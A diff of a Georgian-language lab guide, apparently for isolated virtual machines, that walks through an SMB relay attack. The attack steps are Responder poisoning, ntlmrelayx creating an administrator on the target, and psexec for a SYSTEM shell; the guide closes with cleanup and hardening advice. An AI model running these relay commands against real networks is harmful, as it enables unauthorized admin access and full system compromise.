@@ -1,98 +1,235 @@
-# SMB Relay შეტევა
-# Kali (Attacker) – 192.168.56.10
-# Win10 (Victim-Client) – 192.168.56.20
-# Win2019/Win10 (Target-Server) – 192.168.56.30
-# მიზანი - LLMNR/NBT-NS Poisoning → NTLM Relay → Target-ზე ადმინისტრატორის შექმნა (დამადასტურებელი შელი).
+# ===============================================
+# SMB Relay შეტევის ლაბორატორია - დეტალური გზამკვლევი
+# ===============================================
+# ქსელის ტოპოლოგია:
+# Kali (Attacker)     – 192.168.56.10  (eth0)
+# Win10 (Victim)      – 192.168.56.20
+# Win2019 (Target)    – 192.168.56.30
+# 
+# მიზანი: LLMNR/NBT-NS Poisoning → NTLM Relay → Target-ზე ადმინი შექმნა
+# ===============================================
 
-# წინასწარი კონფიგი (Windows-ებზე, ადმინისტრატორის PowerShell)
-# ორივე Windows-ზე (Victim და Target), რომ შედეგი გარანტირებული იყოს:
+# ===============================================
+# ᲜᲐᲑᲘᲯᲘ 1: TARGET MACHINE (Win2019 - 192.168.56.30)
+# ===============================================
+echo "=== TARGET MACHINE (Win2019 - 192.168.56.30) ==="
+echo "გახსენი PowerShell როგორც Administrator და გაუშვი:"
 
-# ერთნაირი ლოკალური ადმინი ორივეგან
+# Target მანქანაზე გასაშვები ბრძანებები:
 net user labadmin "Passw0rd!23" /add
 net localgroup Administrators labadmin /add
 
-# ახლო ადმინისტრაციის ნებართვა ლოკალური ანგარიშით (UAC remote)
-New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
- -Name LocalAccountTokenFilterPolicy -Value 1 -PropertyType DWord -Force
+# UAC Remote Restrictions-ის გამორთვა
+New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -PropertyType DWord -Force
 
-# File and Printer Sharing ღია იყოს
+# SMB Server Signing გამორთვა
+Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' -Name RequireSecuritySignature -Type DWord -Value 0
+
+# SMB Client Signing გამორთვა
+Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters' -Name RequireSecuritySignature -Type DWord -Value 0
+
+# File and Printer Sharing ფაირვოლ წესების ჩართვა
 Set-NetFirewallRule -DisplayGroup "File and Printer Sharing" -Enabled True
 
-# SMB Signing არ იყოს მოთხოვნილი Target-ზე (მაინც ასეა უმეტეს non-DC-ზე)
-Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' `
- -Name RequireSecuritySignature -Type DWord -Value 0
+# Network Discovery ჩართვა
+netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes
 
-#kali-ს მომზადება
+# ქსელის პროფილი Private-ზე დაყენება
+Set-NetConnectionProfile -NetworkCategory Private
+
+echo "Target კონფიგურაცია დასრულდა. რესტარტი გაუკეთე:"
+shutdown /r /t 60
+echo "(60 წამში გადაირთვება)"
+
+# ===============================================
+# ᲜᲐᲑᲘᲯᲘ 2: VICTIM MACHINE (Win10 - 192.168.56.20)
+# ===============================================
+echo ""
+echo "=== VICTIM MACHINE (Win10 - 192.168.56.20) ==="
+echo "გახსენი PowerShell როგორც Administrator და გაუშვი:"
+
+# Victim მანქანაზე გასაშვები ბრძანებები:
+net user labadmin "Passw0rd!23" /add
+net localgroup Administrators labadmin /add
+
+# UAC Remote Restrictions-ის გამორთვა
+New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -PropertyType DWord -Force
+
+# SMB Client Signing გამორთვა
+Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters' -Name RequireSecuritySignature -Type DWord -Value 0
+
+# File and Printer Sharing ფაირვოლ წესების ჩართვა
+Set-NetFirewallRule -DisplayGroup "File and Printer Sharing" -Enabled True
+
+# Network Discovery ჩართვა
+netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes
+
+# ქსელის პროფილი Private-ზე დაყენება
+Set-NetConnectionProfile -NetworkCategory Private
+
+echo "Victim კონფიგურაცია დასრულდა. რესტარტი გაუკეთე:"
+shutdown /r /t 60
+
+# ===============================================
+# ᲜᲐᲑᲘᲯᲘ 3: KALI MACHINE (192.168.56.10) - მომზადება
+# ===============================================
+echo ""
+echo "=== KALI MACHINE (192.168.56.10) - მომზადება ==="
+echo "Kali-ში terminal გახსენი და გაუშვი:"
+
+# Kali-ზე გასაშვები ბრძანებები:
 sudo apt update
 sudo apt install -y responder crackmapexec impacket-scripts
 
-# Responder-ის მომზადება (Kali)
-# Responder-ს ვუთიშავთ SMB/HTTP-ს, რომ კრედენციალი ntlmrelayx-მა მიიღოს.
+# Responder კონფიგურაციის backup
+sudo cp /etc/responder/Responder.conf /etc/responder/Responder.conf.backup
+
+# SMB და HTTP-ის გამორთვა Responder-ში (რათა ntlmrelayx-მა მიიღოს ტრაფიკი)
 sudo sed -i 's/^SMB = .*/SMB = Off/' /etc/responder/Responder.conf
 sudo sed -i 's/^HTTP = .*/HTTP = Off/' /etc/responder/Responder.conf
 
-# გაუშვი poisoningi
-sudo responder -I eth0 -wrf
-# -I eth0  -> შენი ინტერფეისი (გადაამოწმე `ip -br a`)
-# -w -r -f -> WPAD, LLMNR, NetBIOS spoofing
+# კონფიგურაციის შემოწმება
+echo "შეამოწმე Responder კონფიგურაცია:"
+grep -E "^(SMB|HTTP) =" /etc/responder/Responder.conf
+echo "უნდა ეწეროს: SMB = Off და HTTP = Off"
 
-# Relay სამიზნის განსაზღვრა (Kali)
-echo 192.168.56.30 > targets.txt
+# Target-ების ფაილის შექმნა
+echo "192.168.56.30" > targets.txt
+echo "targets.txt ფაილი შეიქმნა"
 
-# ntlmrelayx გაშვება (Kali)
-# Target-ზე ახალი ადმინის გაკეთებას ვცდით:
+# ===============================================
+# ᲜᲐᲑᲘᲯᲘ 4: KALI MACHINE - შეტევის დაწყება
+# ===============================================
+echo ""
+echo "=== KALI MACHINE - შეტევის დაწყება ==="
+echo ""
+echo "🔹 TERMINAL 1 (Kali-ში): Responder გაშვება"
+echo "sudo responder -I eth0 -wrf"
+echo "  (თუ შენი ინტერფეისი სხვა სახელისაა, eth0-ის მაგივრად ის დაწერე)"
+echo "  შეამოწმე: ip -br a"
+echo ""
 
-find / -name "ntlmrelayx.py" 2>/dev/null
-/usr/share/doc/python3-impacket/examples/ntlmrelayx.py
-sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -h
+echo "🔹 TERMINAL 2 (Kali-ში): ntlmrelayx გაშვება"
+echo "impacket-ntlmrelayx -tf targets.txt -smb2support -c 'net user pwned \"Password123!\" /add && net localgroup administrators pwned /add'"
+echo ""
 
-sudo ln -s /usr/share/doc/python3-impacket/examples/ntlmrelayx.py /usr/local/bin/ntlmrelayx
-sudo chmod +x /usr/local/bin/ntlmrelayx
-sudo ntlmrelayx.py -tf targets.txt -smb2support \
-#ntlmrelayx -h
-###########################
-impacket-ntlmrelayx -tf targets.txt -smb2support \
-  -c 'cmd /c net user pwned "Password123" /add && net localgroup administrators pwned /add'
-#########################
-#  -c 'cmd /c net user pwned "P@ssw0rd!23" /add && net localgroup administrators pwned /add'
-# -tf targets.txt  -> რომელ ჰოსტებზე ვრელეებთ
-# -smb2support     -> SMB2 მხარდაჭერა
-# -c '...'         -> წარმატებისას გასაშვები ბრძანება Target-ზე
+echo "ორივე ბრძანება პარალელურად უნდა მუშაობდეს!"
 
-# aვთენტიკაციის პროვოცირება (Victim-Win10)
-# Victim-ზე გახსენი File Explorer და მისამართის ველში აკრიფე:
-\\not-exist
-#ან CMD-ში
-dir \\idontexist\share
+# ===============================================
+# ᲜᲐᲑᲘᲯᲘ 5: VICTIM MACHINE - შეტევის ტრიგერი
+# ===============================================
+echo ""
+echo "=== VICTIM MACHINE (Win10) - შეტევის ტრიგერი ==="
+echo "როდესაც Kali-ზე ორივე tool მუშაობს, Victim-ზე გაუშვი:"
+echo ""
+echo "🔹 მეთოდი 1 - File Explorer:"
+echo "File Explorer გახსენი → Address Bar-ში აკრიფე:"
+echo "\\\\nonexistent-server"
+echo ""
+echo "🔹 მეთოდი 2 - CMD:"
+echo "cmd გახსენი და აკრიფე:"
+echo "dir \\\\fake-server\\share"
+echo ""
+echo "🔹 მეთოდი 3 - PowerShell:"
+echo "Test-NetConnection fake-server"
+echo ""
+echo "🔹 მეთოდი 4 - Net Use:"
+echo "net use * \\\\nonexistent\\share"
 
-# ეს გამოიწვევს LLMNR/NBNS მოთხოვნას → Responder უპასუხებს → Victim Credentials მივა Kali-ზე → ntlmrelayx მას Target-ზე გადაRelayებს.
+# ===============================================
+# ᲜᲐᲑᲘᲯᲘ 6: KALI MACHINE - წარმატების შემოწმება
+# ===============================================
+echo ""
+echo "=== KALI MACHINE - წარმატების შემოწმება ==="
+echo ""
+echo "როდესაც ntlmrelayx-ში დაინახავ: '[*] SMBD-Thread-X: Authenticating... SUCCESS!'"
+echo "მაშინ შეამოწმე:"
+echo ""
+echo "🔹 ახალი ადმინის შემოწმება:"
+echo "crackmapexec smb 192.168.56.30 -u pwned -p 'Password123!' --local-auth"
+echo ""
+echo "თუ დაინახავ 'Pwn3d!' - წარმატებულია!"
+echo ""
+echo "🔹 SYSTEM Shell-ის მიღება:"
+echo "impacket-psexec pwned:'Password123!'@192.168.56.30"
 
-#წარმატების შემოწმება
-# Kali-ზე ntlmrelayx ფანჯარაში უნდა დაინახო წარმატება. შემდეგ გადაამოწმე, რომ ახალი ადმინი მუშაობს:
+# ===============================================
+# ᲜᲐᲑᲘᲯᲘ 7: TROUBLESHOOTING
+# ===============================================
+echo ""
+echo "=== TROUBLESHOOTING ==="
+echo ""
+echo "🔹 KALI-ზე გადაამოწმე:"
+echo "# ქსელის ინტერფეისი"
+echo "ip -br a"
+echo "ip route"
+echo ""
+echo "# Responder კონფიგურაცია"
+echo "grep -E '^(SMB|HTTP) =' /etc/responder/Responder.conf"
+echo ""
+echo "# Ping Target"
+echo "ping -c 3 192.168.56.30"
+echo ""
 
-crackmapexec smb 192.168.56.30 -u pwned -p 'P@ssw0rd!23' --local-auth
-# უნდა აჩვენოს Pwn3d!
+echo "🔹 TARGET (Win2019) მანქანაზე PowerShell-ით შეამოწმე:"
+echo "# SMB კონფიგურაცია"
+echo "Get-SmbServerConfiguration | select RequireSecuritySignature"
+echo "Get-SmbClientConfiguration | select RequireSecuritySignature"
+echo "# ორივე False უნდა იყოს"
+echo ""
+echo "# ქსელის პროფილი"
+echo "Get-NetConnectionProfile"
+echo "# NetworkCategory: Private უნდა იყოს"
+echo ""
+echo "# ფაირვოლი"
+echo "Get-NetFirewallRule -DisplayGroup 'File and Printer Sharing' | select DisplayName, Enabled"
+echo ""
 
-# SYSTEM შელი (სერვისით) Target-ზე:
-psexec.py pwned:'P@ssw0rd!23'@192.168.56.30 cmd
+echo "🔹 VICTIM (Win10) მანქანაზე PowerShell-ით შეამოწმე:"
+echo "# SMB კლიენტი"
+echo "Get-SmbClientConfiguration | select RequireSecuritySignature"
+echo "# False უნდა იყოს"
+echo ""
+echo "# ქსელის პროფილი"
+echo "Get-NetConnectionProfile"
+echo ""
 
-#თუ Pwn3d! ვერ მივიღეთ, შეამოწმე:
+echo "🔹 ყველა მანქანაზე ping გადაამოწმე:"
+echo "ping 192.168.56.10  # Kali"
+echo "ping 192.168.56.20  # Victim"
+echo "ping 192.168.56.30  # Target"
 
-#Target-ზე RequireSecuritySignature ნამდვილად 0ა;
-#Victim-ზე ქსელი Private და ფაილ-პრინტის ფაიర్వოლი ჩართულია;
-#ორივეგან labadmin პაროლი ერთნაირია (რელეირება NTLMv2-ზე ხდება).
-#Alternative Trigger (from Victim) — Optional
-#If the user does not manually generate any traffic, you can trigger an authentication request from the Victim machine with a simple UNC path:
-\\192.168.56.10\share
+# ===============================================
+# ᲜᲐᲑᲘᲯᲘ 8: CLEANUP
+# ===============================================
+echo ""
+echo "=== CLEANUP ==="
+echo ""
+echo "🔹 TARGET (Win2019) მანქანაზე:"
+echo "net user pwned /del"
+echo "net user labadmin /del"
+echo ""
+echo "🔹 VICTIM (Win10) მანქანაზე:"
+echo "net user labadmin /del"
+echo ""
+echo "🔹 KALI მანქანაზე:"
+echo "sudo cp /etc/responder/Responder.conf.backup /etc/responder/Responder.conf"
+echo "rm targets.txt"
 
-#გასუფთავება
-# Cleanup (Target-Server)
-net user pwned /del
-
-#გამორთე LLMNR/NBNS, გამორთე WPAD.
-#ჩართე/მოითხოვე SMB Signing სერვერებზე (განსაკუთრებით ფაილ-სერვერებზე).
-#გამოიყენე LAPS (უნიკალური ლოკალური ადმინის პაროლები).
-#ფაირვოლი: დახურე 137/138/139/445 სადაც არ არის საჭირო.
-#ეს ლაბი გარანტირებულად გაძლევს „დამადასტურებელ შედეგს“ — Target-ზე ადმინისტრატორის შექმნას და შემდგომ SYSTEM შელს Kali-დან.
-
-
+# ===============================================
+# უსაფრთხოების რეკომენდაციები
+# ===============================================
+echo ""
+echo "=== უსაფრთხოების რეკომენდაციები ==="
+echo ""
+echo "🔒 SMB Signing ჩართვა:"
+echo "Set-SmbServerConfiguration -RequireSecuritySignature \$true -Force"
+echo "Set-SmbClientConfiguration -RequireSecuritySignature \$true -Force"
+echo ""
+echo "🔒 LLMNR/NBT-NS გამორთვა Group Policy-ით:"
+echo "Computer Configuration → Administrative Templates → Network → DNS Client"
+echo "→ 'Turn off multicast name resolution' = Enabled"
+echo ""
+echo "🔒 WPAD გამორთვა Registry-ით:"
+echo "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad"
+echo "→ WpadOverride = 1"
